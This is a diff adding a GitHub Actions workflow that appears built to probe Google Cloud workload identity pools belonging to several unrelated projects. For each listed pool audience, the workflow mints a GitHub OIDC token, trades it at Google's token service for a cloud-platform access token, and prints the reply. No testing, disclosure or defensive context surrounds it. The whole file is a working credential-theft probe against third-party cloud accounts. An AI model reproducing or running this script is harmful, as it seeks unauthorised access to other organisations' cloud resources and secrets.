@@ -1,0 +1,39 @@
+name: i911nongh
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe
+        run: |
+          set +e
+          cat > aud.txt <<'AUD'
+          //iam.googleapis.com/projects/234382750829/locations/global/workloadIdentityPools/terraform-cloud/providers/terraform-cloud
+          //iam.googleapis.com/projects/339822648213/locations/global/workloadIdentityPools/kamono-portfolio-tfc-pool/providers/kamono-portfolio-tfc-provider-id
+          //iam.googleapis.com/projects/128015056831/locations/global/workloadIdentityPools/tfc-agents-pool/providers/tfc-agents-provider
+          //iam.googleapis.com/projects/476538149566/locations/global/workloadIdentityPools/tfe-pool/providers/tfe-provider
+          //iam.googleapis.com/projects/220317924975/locations/global/workloadIdentityPools/gitlab-com/providers/gitlab-com-oidc
+          //iam.googleapis.com/projects/1002415312824/locations/global/workloadIdentityPools/gitlab-pool-oidc-amp-1290/providers/gitlab-jwt-amp-1290
+          //iam.googleapis.com/projects/183522916153/locations/global/workloadIdentityPools/financial-coach/providers/vercel
+          //iam.googleapis.com/projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider
+          AUD
+          while read -r aud; do
+            [ -z "$aud" ] && continue
+            echo "### AUD $aud"
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud" | jq -r .value)
+            echo "jwt_len=${#J}"
+            curl -s -o r.json -w "HTTP=%{http_code}\n" -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "audience=$aud" \
+              -d "subject_token=$J" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform"
+            head -c 500 r.json
+            echo
+          done < aud.txt
